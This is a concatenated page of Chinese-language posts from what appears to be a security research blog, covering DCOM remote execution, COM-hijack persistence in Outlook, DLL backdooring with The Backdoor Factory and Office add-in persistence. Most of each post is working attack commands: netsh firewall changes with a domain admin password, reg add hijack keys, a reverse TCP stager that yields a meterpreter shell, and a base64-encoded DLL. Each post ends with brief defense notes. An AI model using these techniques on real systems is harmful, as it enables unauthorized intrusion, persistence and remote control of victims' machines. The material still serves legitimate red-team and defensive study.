<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall firewall add rule name="any" protocol=TCP dir=in localport=any action=allow
</code></pre></div></div>

<p><strong>4、远程执行</strong></p>

<p>使用net use 远程连接，接着执行如下powershell代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.0.2")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>选择使用<code class="language-plaintext highlighter-rouge">'9BA05972-F6A8-11CF-A442-00A0C90A8F39'</code>，执行程序的用户名为当前登录用户</p>

<p><strong>5、远程恢复域控防火墙设置</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall firewall Delete rule name="any"
</code></pre></div></div>

<h2 id="0x04-防御">0x04 防御</h2>
<hr>

<p>针对利用DCOM远程执行程序，只要开启防火墙即可</p>

<p>也可禁用内置帐户Administrator对COM的远程启动和远程激活权限，命令如下:</p>

<p><code class="language-plaintext highlighter-rouge">dcomcnfg.exe</code></p>

<p>打开组件服务-我的电脑-属性-COM安全-启动和激活权限-编辑默认值，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/4-3.png" alt="Alt text"></p>

<p>当然，通过抓包分析特征也是可以的</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文对使用DCOM执行程序的方法作了利用分析，最后感谢Matt Nelson‏ @enigma0x3分享他的文章。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 15, 2017
  </div>

  
</article><article class="post">
  <h1>Use COM Object hijacking to maintain persistence——Hijack Outlook</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>APT组织Trula使用的一个后门利用方法，通过COM劫持实现在Outlook启动时加载dll，特点是只需要当前用户的权限即可实现。</p>

<p>本文将参考公开的资料对这个方法进行测试，编写一个自动化利用脚本，扩展用法，分享多个可用的劫持位置，结合利用思路给出防御建议</p>

<p>参考资料：</p>

<p>https://www.welivesecurity.com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor.pdf</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>利用方法</li>
  <li>Powershell脚本实现细节</li>
  <li>扩展用法</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-利用方法">0x02 利用方法</h2>
<hr>

<p>Outlook在启动时会加载多个COM对象，我们可以通过修改注册表的方式劫持Outlook的启动过程，用来加载DLL</p>

<p>这里的利用方法需要添加两个注册表，修改两个COM对象</p>

<p>由于是修改HKCU的注册表，所以使用当前用户权限即可</p>

<h3 id="1com对象1用来加载第二个com对象">（1）COM对象1，用来加载第二个COM对象</h3>

<p>添加如下注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKCU\Software\Classes\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs = {49CBB1C7-97D1-485A-9EC1-A26065633066}
</code></pre></div></div>

<p>通过命令行实现的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKCU\Software\Classes\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs /t REG_SZ /d "{49CBB1C7-97D1-485A-9EC1-A26065633066}" /f
</code></pre></div></div>

<h3 id="2com对象2用来加载dll">（2）COM对象2，用来加载DLL</h3>

<p>添加如下注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066} = Mail Plugin
HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32 = [Path to the backdoor DLL]
HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32\ThreadingModel = Apartment
</code></pre></div></div>

<p>通过命令行实现的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066} /t REG_SZ /d "Mail Plugin" /f
reg add HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32 /t REG_SZ /d "c:\\test\\calc.dll" /f
reg add HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32 /v ThreadingModel /t REG_SZ /d "Apartment" /f
</code></pre></div></div>

<p>calc.dll可使用之前的测试DLL，地址为：https://github.com/3gstudent/test/blob/master/calc.dll</p>

<p>添加注册表后启动Outlook，多次加载DLL，弹出多个计算器，这里可以使用互斥量确保只弹出一个计算器，DLL的下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calcmutex.dll</p>

<p>对于64位Windows系统，如果安装了32位的Office，两个COM对象的注册表位置需要修改为<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\Wow6432Node\CLSID\</code></p>

<h2 id="0x03-powershell脚本实现细节">0x03 Powershell脚本实现细节</h2>
<hr>

<p>实现流程如下：</p>

<ol>
  <li>判断操作系统位数</li>
  <li>判断Office软件版本</li>
  <li>如果是64位系统安装32位Office，注册表的位置为<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\Wow6432Node\CLSID\</code>，否则，注册表的位置为<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\CLSID\</code></li>
  <li>添加对应注册表</li>
</ol>

<p>具体代码如下：</p>

<h4 id="1-判断操作系统位数">1. 判断操作系统位数</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ([IntPtr]::Size -eq 8)
{
    '64-bit'
}
else
{
    '32-bit'
}
</code></pre></div></div>

<h4 id="2-判断安装office软件版本">2. 判断安装office软件版本</h4>

<p>查看默认安装路径<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office</code>是否包含文件夹<code class="language-plaintext highlighter-rouge">MEDIA</code></p>

<p>如果包含，那么为64位Office，否则为32位Office</p>

<p>powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Try  
{  
	dir C:\Program Files\Microsoft Office\MEDIA
	Write-Host "Microsoft Office: 64-bit"
}
Catch  
{ 
	Write-Host "Microsoft Office: 32-bit"
}
</code></pre></div></div>

<p>实现代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-OutlookPersistence.ps1</p>

<p>代码实现了自动判断操作系统位数和Office软件版本，添加对应的注册表项</p>

<h2 id="0x04-扩展用法">0x04 扩展用法</h2>
<hr>

<p>使用Process Monitor监控Outlook启动过程，查找是否有其他可用的COM对象</p>

<p>经测试，我在Outlook2013上找到多个可用方法</p>

<p>COM对象1替换成以下任意一个，COM对象2保持不变</p>

<p>可用的COM对象1：</p>

<ul>
  <li>{B056521A-9B10-425E-B616-1FCD828DB3B1}</li>
  <li>{EFEF7FDB-0CED-4FB6-B3BB-3C50D39F4120}</li>
  <li>{93E5752E-B889-47C5-8545-654EE2533C64}</li>
  <li>{56FDF344-FD6D-11D0-958A-006097C9A090}</li>
  <li>{2163EB1F-3FD9-4212-A41F-81D1F933597F}</li>
  <li>{A6A2383F-AD50-4D52-8110-3508275E77F7}</li>
  <li>{F959DBBB-3867-41F2-8E5F-3B8BEFAA81B3}</li>
  <li>{88D96A05-F192-11D4-A65F-0040963251E5}</li>
  <li>{807583E5-5146-11D5-A672-00B0D022E945}</li>
  <li>{529A9E6B-6587-4F23-AB9E-9C7D683E3C50}</li>
  <li>{3CE74DE4-53D3-4D74-8B83-431B3828BA53}</li>
  <li>{A4B544A1-438D-4B41-9325-869523E2D6C7}</li>
  <li>{33C53A50-F456-4884-B049-85FD643ECFED}</li>
  <li>{C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6}</li>
  <li>{275C23E2-3747-11D0-9FEA-00AA003F8646}</li>
  <li>{C15BB852-6F97-11D3-A990-00104B2A619F}</li>
  <li>{ED475410-B0D6-11D2-8C3B-00104B2A6676}</li>
  <li>{1299CF18-C4F5-4B6A-BB0F-2299F0398E27}</li>
  <li>{DCB00C01-570F-4A9B-8D69-199FDBA5723B}</li>
  <li>{C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6}</li>
</ul>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>监控以下注册表项下的创建和修改操作：</p>

<ul>
  <li>HKCU\Software\Classes\CLSID\</li>
  <li>HKCU\Software\Classes\Wow6432Node\CLSID\</li>
</ul>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了通过COM劫持实现在Outlook启动时加载dll的方法，分享多个可用的劫持位置，结合利用思路给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June  5, 2019
  </div>

  
</article><article class="post">
  <h1>利用BDF向DLL文件植入后门</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91EXE%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/">《利用BDF向EXE文件植入后门》</a>介绍了使用The Backdoor Factory向EXE文件植入后门的方法，这次将要介绍向DLL文件植入后门的思路，演示一种DLL劫持的利用方法，总结该方法的特点，分析防御思路</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>劫持自己的DLL，修复BUG</li>
  <li>劫持系统的DLL，绕过Autoruns的后门检测</li>
</ul>

<h2 id="0x02-利用思路">0x02 利用思路</h2>
<hr>

<p>DLL同EXE文件的植入思路相同，也是通过修改程序的执行流程，跳转到Code Caves，执行payload，再返回至程序的正常流程</p>

<p>DLL同EXE文件最大的区别是多了导出函数的功能</p>

<p>在实现DLL劫持时，常常需要获得原DLL的导出函数，模拟导出函数，添加payload，实现利用</p>

<p>那么，The Backdoor Factory在DLL文件的后门植入上，是否要考虑导出函数呢？</p>

<p>下面进行测试，得出结论</p>

<h2 id="0x03-编写程序进行测试">0x03 编写程序进行测试</h2>
<hr>

<p>测试Dll testdll.dll：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBox(NULL, NULL, NULL, 0);
		//Sleep(5000);
		printf("[+] DLL_PROCESS_ATTACH\n");
	case DLL_THREAD_ATTACH:
		printf("[+] DLL_THREAD_ATTACH\n");
	case DLL_THREAD_DETACH:
		printf("[+] DLL_THREAD_DETACH\n");
	case DLL_PROCESS_DETACH:
		printf("[+] DLL_PROCESS_DETACH\n");
		break;
	}
	return TRUE;
}

void Export1()
{
	printf("[+] Export1\n");
}
</code></pre></div></div>

<p>导出函数为<code class="language-plaintext highlighter-rouge">Export1</code></p>

<p>Dll加载程序 loader.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt; 
typedef void(*Export)();
int main(int argc, char* argv[])
{
	Export exporttest;
	printf("[*] LoadLibrary\n");
	HMODULE hDllLib = LoadLibrary("testdll.dll");
	exporttest=(Export)GetProcAddress(hDllLib ,"Export1");
	exporttest();
	Sleep(10000);
	FreeLibrary(hDllLib);
	printf("[*] FreeLibrary\n");
	return 0;
}
</code></pre></div></div>

<p>程序执行如下图，加载testdll.dll，调用导出函数<code class="language-plaintext highlighter-rouge">Export1</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/2-1.png" alt="Alt text"></p>

<p>使用The Backdoor Factory为DLL文件添加后门：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/exec CMD=calc.exe -f raw &gt;calc.bin
./backdoor.py -f testdll.dll -s user_supplied_shellcode_threaded -U calc.bin -a
</code></pre></div></div>

<p>再次执行loader.exe，测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/2-2.png" alt="Alt text"></p>

<p>成功执行payload，但是改变了程序流程，无法正常返回<code class="language-plaintext highlighter-rouge">FreeLibrary</code></p>

<p>需要对DLL进行调试,找到出错的原因</p>

<p>首先生成空的跳转模板：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f testdll.dll -s cave_miner_inline
</code></pre></div></div>

<p>选择<code class="language-plaintext highlighter-rouge">.text</code>段</p>

<p>执行Loader.exe，程序一切正常，那么就是中间的payload出了问题</p>

<p>使用Immunity Debugger打开新的testdll.dll，找到劫持的位置，payload保存在<code class="language-plaintext highlighter-rouge">0x10005716</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/2-3.png" alt="Alt text"></p>

<p>这里可以推测，payload只要能够保持堆栈平衡，那么就不会影响程序的正常执行</p>

<p>接下来，在<code class="language-plaintext highlighter-rouge">0x10005716</code>处填入我们的payload</p>

<p>可以使用<code class="language-plaintext highlighter-rouge">CFF Explorer</code>添加payload</p>

<p>首先定位payload起始点</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUSHAD
PUSHFD
</code></pre></div></div>

<p>对应的16进制代码为<code class="language-plaintext highlighter-rouge">609C</code></p>

<p>在CFF Explorer中切换到Hex Editor视图，搜索<code class="language-plaintext highlighter-rouge">609C</code>,定位起始点<code class="language-plaintext highlighter-rouge">0x0000571A</code></p>

<p><strong>注：</strong></p>

<p>通过Immunity Debugger获得的内存虚拟地址为<code class="language-plaintext highlighter-rouge">0x1000571A</code>，二者对应，位置正确</p>

<p>为了扩大payload空间，可以将后面的调整堆栈平衡代码整体后移</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/2-5.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/2-6.png" alt="Alt text"></p>

<p>将<code class="language-plaintext highlighter-rouge">0x0005772</code>-<code class="language-plaintext highlighter-rouge">0x0000579E</code>的数据整体后移，中间填入<code class="language-plaintext highlighter-rouge">0x90</code></p>

<p>选中该部分内容，<code class="language-plaintext highlighter-rouge">右键</code>-<code class="language-plaintext highlighter-rouge">Copy</code>-<code class="language-plaintext highlighter-rouge">Hex</code></p>

<p>找到合适的位置，<code class="language-plaintext highlighter-rouge">右键</code>-<code class="language-plaintext highlighter-rouge">Fill With...</code></p>

<p>完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/1-1.gif" alt="Alt text"></p>

<p>依此方法，中间填入修改后的payload即可，完成Bug修复</p>

<p>通过Immunity Debugger查看DLL文件，可以看到The Backdoor Factory对DLL和EXE文件进行跳转劫持的位置一样</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/2-7.png" alt="Alt text"></p>

<p><strong>得出结论：</strong></p>

<p>对于DLL文件来说，劫持初始化部分造成的结果是在<code class="language-plaintext highlighter-rouge">LoadLibrary</code>时即可执行payload，如果想在程序加载DLL导出函数时执行payload，将跳转代码改到导出函数内即可</p>

<h2 id="0x04-劫持系统的dll">0x04 劫持系统的DLL</h2>
<hr>

<p>针对Office 2010，分享几个自己找到的DLL劫持利用位置</p>

<h3 id="1劫持word-审阅试图">1、劫持Word-审阅试图</h3>

<p>LOCALSVC.DLL，位于<code class="language-plaintext highlighter-rouge">C:\Program Files\Common Files\microsoft shared\RRLoc14\</code></p>

<p>对该dll添加payload</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f LOCALSVC.DLL -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded
</code></pre></div></div>

<p>替换dll(需要管理员权限)，启动word.exe，切换至审阅视图，弹回meterpreter</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/1-2.gif" alt="Alt text"></p>

<h3 id="2劫持word-插入-图片">2、劫持word-插入-图片</h3>

<p>tiptsf.dll，位于<code class="language-plaintext highlighter-rouge">C:\Program Files\Common Files\microsoft shared\ink\</code></p>

<p>需要<code class="language-plaintext highlighter-rouge">TrustedInstaller</code>权限才能替换</p>

<p>关于如何获得<code class="language-plaintext highlighter-rouge">TrustedInstaller</code>权限，可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a></p>

<h3 id="3劫持word-文件">3、劫持word-文件</h3>

<p>也影响别的位置：</p>

<p>word -页面布局-主题-浏览主题</p>

<p>GrooveIntlResource.dll，位于<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office\Office14\2052</code></p>

<p>需要管理员权限</p>

<h3 id="4劫持excel-插入-图片">4、劫持Excel-插入-图片</h3>

<p>MSPTLS.DLL，位于<code class="language-plaintext highlighter-rouge">C:\Program Files\Common Files\microsoft shared\OFFICE14\</code></p>

<p>需要管理员权限</p>

<p>以上测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-24/1-3.gif" alt="Alt text"></p>

<p><strong>注:</strong></p>

<p>本节内容仅为了演示DLL劫持的一些利用方法，这些特殊的劫持位置只会在软件的特定功能打开时才会启动，所以能够绕过Autoruns的检测</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>对于系统DLL，通过会带有微软签名，如果对DLL植入后门，签名会失效，这是一个老生常谈的问题</p>

<p>而对于第三方开发的软件，调用的第三方DLL不加签名，那么被利用的风险很大</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文测试了使用The Backdoor Factory向DLL文件植入后门的方法，介绍修复BUG的思路，分享了一种DLL劫持的利用方法，仅供测试，通过总结该利用方法的特点，简要介绍了防御方面需要注意的问题</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 24, 2017
  </div>

  
</article><article class="post">
  <h1>Use Office to maintain persistence</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>对于Windows平台，Microsoft Office的普及率很高。站在攻击者的角度，通常会选择在Office软件中植入后门。</p>

<p>我在一篇博客上看到了Office后门的多种利用方法，我对其进行了研究测试，挑选其中较为通用、隐蔽的方式，编写POC脚本实现自动利用。</p>

<p><strong>博客地址：</strong></p>

<p>https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/</p>

<p>作者： William Knowles@william_knows</p>

<p><strong>POC：</strong></p>

<p>https://github.com/3gstudent/Office-Persistence</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>针对Word、Excel、PowerPoint的四种后门利用方法</li>
  <li>编写Powershell脚本实现自动利用</li>
  <li>比较优缺点，分析防御方法</li>
</ul>

<h2 id="0x02-word-wll">0x02 Word WLL</h2>
<hr>

<h3 id="1手动测试">1、手动测试</h3>

<p>开发工具：<code class="language-plaintext highlighter-rouge">VC6.0</code></p>

<p>新建dll工程，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			MessageBox(NULL,"hello world，I'm 3kb","title",MB_OK);
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }return TRUE;
}
</code></pre></div></div>

<p>编译成msg.dll，作如下设置减小编译文件体积：</p>

<ul>
  <li>Build：release</li>
  <li>添加代码：#pragma comment(linker,”/OPT:nowin98”)</li>
  <li>工程设置-&gt;Win32 Release-&gt;C/C++-&gt;Code Generation-&gt;Use run-time library:-&gt;Multithreaded DLL</li>
</ul>

<p>经过优化，dll大小为3kb</p>

<p>重命名为msg.wll，保存路径如下：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Word\Startup</code></p>

<p>启动Word.exe，弹框，界面卡住，Word无法正常执行；关闭弹出的对话框后，Word正常启动</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>通过Metasploit的<code class="language-plaintext highlighter-rouge">msfvenom</code>生成的dll，会导致Word程序崩溃</p>

<p>修改c代码，实现启动计算器，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			WinExec("calc.exe",SW_SHOWNORMAL);
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }return TRUE;
}
</code></pre></div></div>

<p>编译成calc.dll，优化后大小为3kb</p>

<p>重命名为calc.wll，保存在路径<code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Word\Startup</code></p>

<p>启动Word.exe，弹出计算器，并且word正常启动</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Startup路径可保存多个wll，支持启动多个wll</p>

<h3 id="2编写powershell脚本实现">2、编写Powershell脚本实现</h3>

<p>wll路径对应的powershell代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">$env:APPDATA+"\Microsoft\Word\Startup\calc.wll"</code></p>

<p>将编译好的3kb大小的calc.dll作base64加密并存储于变量中：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = [System.IO.File]::ReadAllBytes('calc.dll')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("calcdllbase64.txt") 
</code></pre></div></div>

<p>得到</p>

<p><code class="language-plaintext highlighter-rouge">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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA